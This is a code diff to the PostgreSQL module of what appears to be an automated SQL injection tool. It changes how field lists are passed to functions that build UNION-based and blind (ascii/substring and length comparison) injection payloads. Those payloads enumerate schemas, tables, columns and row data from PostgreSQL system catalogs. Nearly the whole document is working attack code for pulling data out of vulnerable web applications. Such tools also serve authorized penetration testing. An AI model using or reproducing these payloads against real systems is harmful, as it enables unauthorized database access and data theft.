@@ -39,41 +39,41 @@ class PostgresMole(DbmsMole):
     def _schemas_query_info(self):
         return {
             'table' : 'pg_tables',
-            'field' : 'distinct(schemaname)'
+            'field' : ['distinct(schemaname)']
         }
     
     def _tables_query_info(self, db):
         return {
             'table' : 'pg_tables',
-            'field' : 'tablename',
+            'field' : ['tablename'],
             'filter': "schemaname = '{db}'".format(db=db)
         }
     
     def _columns_query_info(self, db, table):
         return {
             'table' : 'pg_namespace,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid',
-            'field' : 'attname',
+            'field' : ['attname'],
             'filter': "a.relnamespace=pg_namespace.oid AND attnum>0 AND nspname='{db}' AND a.relname='{table}'".format(db=db, table=table)
         }
         
     def _fields_query_info(self, fields, db, table, where):
         return {
             'table' : db + '.' + table,
-            'field' : ','.join(fields),
+            'field' : fields,
             'filter': where
         }
         
     def _dbinfo_query_info(self):
         return {
-            'field' : 'getpgusername(),version(),current_database()', 
+            'field' : ['getpgusername()','version()','current_database()'], 
             'table' : ''
         }
         
-    def forge_blind_query(self, index, value, field, table, where="1=1", offset=0):
-        if table == 'pg_tables' and where == "1=1" and field == 'distinct(schemaname)':
+    def forge_blind_query(self, index, value, fields, table, where="1=1", offset=0):
+        if table == 'pg_tables' and where == "1=1" and len(fields) == 1 and fields[0] == 'distinct(schemaname)':
             return ' and {op_par}' + str(value) + ' < (select distinct on(schemaname) ascii(substring(schemaname, '+str(index)+', 1)) from ' + table+' where ' + self.parse_condition(where) + ' limit 1 offset '+str(offset) + ')'
         else:
-            return DbmsMole.forge_blind_query(self, index, value, field, table, where, offset)
+            return DbmsMole.forge_blind_query(self, index, value, fields, table, where, offset)
         
         
     def forge_blind_count_query(self, operator, value, table, where="1=1"):
@@ -82,11 +82,11 @@ class PostgresMole(DbmsMole):
         else:
             return DbmsMole.forge_blind_count_query(self, operator, value, table, where)
 
-    def forge_blind_len_query(self, operator, value, field, table, where="1=1", offset=0):
-        if table == 'pg_tables' and where == "1=1" and field == 'distinct(schemaname)':
+    def forge_blind_len_query(self, operator, value, fields, table, where="1=1", offset=0):
+        if table == 'pg_tables' and where == "1=1" and len(fields) == 1 and fields[0] == 'distinct(schemaname)':
             return ' and {op_par}' + str(value) + ' ' + operator + ' (select distinct on(schemaname) length(schemaname) from '+table+' where ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)+')'
         else:
-            return DbmsMole.forge_blind_len_query(self, operator, value, field, table, where, offset)
+            return DbmsMole.forge_blind_len_query(self, operator, value, fields, table, where, offset)
 
     @classmethod
     def dbms_name(cls):
@@ -111,11 +111,13 @@ class PostgresMole(DbmsMole):
         return self.finger.is_string_query
     
     def forge_count_query(self, column_count, fields, table_name, injectable_field, where = None):
-        if not self.finger is None and not self.finger.is_string_query:
-            return self.forge_integer_count_query(column_count, fields, table_name, injectable_field, where)
         query = " and 1 = 0 UNION ALL SELECT "
+        if len(fields) == 1 and fields[0] == 'distinct(schemaname)':
+            count_string = 'distinct(schemaname)'
+        else:
+            count_string = '*'
         query_list = list(self.query)
-        query_list[injectable_field] = ("(" + PostgresMole.out_delimiter + "||COUNT(" + fields + ")||" + PostgresMole.out_delimiter + ")")
+        query_list[injectable_field] = ("(" + PostgresMole.out_delimiter + "||COUNT(" + count_string + ")||" + PostgresMole.out_delimiter + ")")
     
         query += ','.join(query_list)
         at_end = ''
@@ -130,11 +132,11 @@ class PostgresMole(DbmsMole):
         query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.query)
         # It's not beatiful but it works :D
-        if fields == 'distinct(schemaname)':
+        if len(fields) == 1 and fields[0] == 'distinct(schemaname)':
             query += " distinct on(schemaname) "
-            fields = 'schemaname'
+            fields = ['schemaname']
         query_list[injectable_field] = ("(" + PostgresMole.out_delimiter + "||(" +
-                                            ('||' + PostgresMole.inner_delimiter + '||').join(fields.split(',')) +
+                                            ('||' + PostgresMole.inner_delimiter + '||').join(fields) +
                                             ")||" + PostgresMole.out_delimiter + ")"
                                         )
         query += ','.join(query_list)
@@ -150,7 +152,11 @@ class PostgresMole(DbmsMole):
     def forge_integer_count_query(self, column_count, fields, table_name, injectable_field, where = None):
         query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.query)
-        query_list[injectable_field] = ("cast(cast(" + PostgresMole.integer_out_delimiter + " as varchar(10))||COUNT(" + fields + ")||cast(" + PostgresMole.integer_out_delimiter + " as varchar(10)) as bigint)")
+        if len(fields) == 1 and fields[0] == 'distinct(schemaname)':
+            count_string = 'distinct(schemaname)'
+        else:
+            count_string = '*'
+        query_list[injectable_field] = ("cast(cast(" + PostgresMole.integer_out_delimiter + " as varchar(10))||COUNT(" + count_string + ")||cast(" + PostgresMole.integer_out_delimiter + " as varchar(10)) as bigint)")
         query += ','.join(query_list)
         at_end = ''
         if len(table_name) > 0:
@@ -164,11 +170,11 @@ class PostgresMole(DbmsMole):
         query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.query)
         # It's not beatiful but it works :D
-        if fields == 'distinct(schemaname)':
+        if len(fields) == 1 and fields[0] == 'distinct(schemaname)':
             query += " distinct on(schemaname) "
-            fields = 'schemaname'
+            fields = ['schemaname']
         query_list[injectable_field] = ("cast(cast(" + PostgresMole.integer_out_delimiter + " as varchar(10))||length(" +
-                                            ('||cast(' + PostgresMole.inner_delimiter + ' as varchar(10))||').join(fields.split(',')) +
+                                            ('||cast(' + PostgresMole.inner_delimiter + ' as varchar(10))||').join(fields) +
                                             ")||cast(" + PostgresMole.integer_out_delimiter + " as varchar(10)) as bigint)"
                                         )
         query += ','.join(query_list)
@@ -185,11 +191,11 @@ class PostgresMole(DbmsMole):
         query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(self.query)
         # It's not beatiful but it works :D
-        if fields == 'distinct(schemaname)':
+        if len(fields) == 1 and fields[0] == 'distinct(schemaname)':
             query += " distinct on(schemaname) "
-            fields = 'schemaname'
+            fields = ['schemaname']
         query_list[injectable_field] = ("cast(cast(" + PostgresMole.integer_out_delimiter + " as varchar(10))||ascii(substring(" +
-                                            ('||cast(' + PostgresMole.inner_delimiter + ' as varchar(10))||').join(fields.split(',')) +
+                                            ('||cast(' + PostgresMole.inner_delimiter + ' as varchar(10))||').join(fields) +
                                             ", " + str(index)+",1))||cast(" + PostgresMole.integer_out_delimiter + " as varchar(10)) as bigint)"
                                         )
         query += ','.join(query_list)
